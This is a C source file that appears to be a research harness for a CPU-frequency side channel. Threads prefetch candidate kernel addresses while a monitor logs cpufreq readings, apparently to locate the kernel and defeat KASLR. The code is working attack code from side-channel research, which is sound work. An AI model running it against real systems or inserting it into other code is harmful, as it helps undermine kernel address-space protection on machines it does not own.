#include <sys/resource.h>
#include <sys/syscall.h>
#include <sys/wait.h>

#include "../util/freq-utils.h"
#include "../util/rapl-utils.h"
#include "../util/util.h"

volatile static int attacker_core_ID;

#define TIME_BETWEEN_MEASUREMENTS 10000000L // 1 millisecond

#define STACK_SIZE 8192

struct args_t {
	uint64_t iters;
	uint64_t address;
};

static __attribute__((noinline)) int victim(void *varg)
{
	struct args_t *arg = varg;
	uint64_t address = (uint64_t)arg->address;

	asm volatile(
		".align 64\t\n"
		"loop:\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"prefetcht0 (%0)\n\t"
		"jmp loop\n\t"
		:
		: "r"(address));

	return 0;
}

// Collects traces
static __attribute__((noinline)) int monitor(void *in)
{
	static int rept_index = 0;

	struct args_t *arg = (struct args_t *)in;

	// Pin monitor to a single CPU
	pin_cpu(attacker_core_ID);

	// Set filename
	// The format is, e.g., ./out/freq_02_2330.out
	// where 02 is the selector and 2330 is an index to prevent overwriting files
	char output_filename[64];
	sprintf(output_filename, "./out/freq_%" PRIx64 "_%06d.out", arg->address, rept_index);
	rept_index += 1;

	// Prepare output file
	FILE *output_file = fopen((char *)output_filename, "w");
	if (output_file == NULL) {
		perror("output file");
	}

	// Prepare
	uint32_t khz;

	// Collect measurements
	for (uint64_t i = 0; i < arg->iters; i++) {

		// Wait before next measurement
		nanosleep((const struct timespec[]){{0, TIME_BETWEEN_MEASUREMENTS}}, NULL);

		// Collect measurement
		khz = frequency_cpufreq(attacker_core_ID);

		// Store measurement
		fprintf(output_file, "%" PRIu32 "\n", khz);
	}

	// Clean up
	fclose(output_file);
	return 0;
}

int main(int argc, char *argv[])
{
	// Check arguments
	if (argc != 4) {
		fprintf(stderr, "Wrong Input! Enter: %s <ntasks> <samples> <outer>\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	// Read in args
	int ntasks;
	struct args_t arg;
	int outer;
	sscanf(argv[1], "%d", &ntasks);
	if (ntasks < 0) {
		fprintf(stderr, "ntasks cannot be negative!\n");
		exit(1);
	}
	sscanf(argv[2], "%" PRIu64, &(arg.iters));
	sscanf(argv[3], "%d", &outer);
	if (outer < 0) {
		fprintf(stderr, "outer cannot be negative!\n");
		exit(1);
	}

	// Prepare up monitor/attacker
	attacker_core_ID = 0;
	frequency_cpufreq(attacker_core_ID);

	size_t step = 2 * 1024 * 1024;
	size_t start = 0xffffffff80000000ull;
	size_t steps_max = 512;
	// size_t start = 0xffffffff80000000ull + 160 * step;	# FIXME: reduce search space
	// size_t steps_max = 4;

	// Allocate memory for the threads
	char *tstacks = mmap(NULL, (ntasks + 1) * STACK_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

	// Run experiment once for each selector
	for (int i = 0; i < outer * steps_max; i++) {

		// Set alternating selector
		arg.address = start + (i % steps_max) * step;

		// Start victim threads
		int tids[ntasks];
		for (int tnum = 0; tnum < ntasks; tnum++) {
			tids[tnum] = clone(&victim, tstacks + (ntasks - tnum) * STACK_SIZE, CLONE_VM | SIGCHLD, &arg);
		}

		// Start the monitor thread
		clone(&monitor, tstacks + (ntasks + 1) * STACK_SIZE, CLONE_VM | SIGCHLD, (void *)&arg);

		// Join monitor thread
		wait(NULL);

		// Kill victim threads
		for (int tnum = 0; tnum < ntasks; tnum++) {
			syscall(SYS_tgkill, tids[tnum], tids[tnum], SIGTERM);

			// Need to join o/w the threads remain as zombies
			// https://askubuntu.com/a/427222/1552488
			wait(NULL);
		}
	}

	// Clean up
	munmap(tstacks, (ntasks + 1) * STACK_SIZE);
}
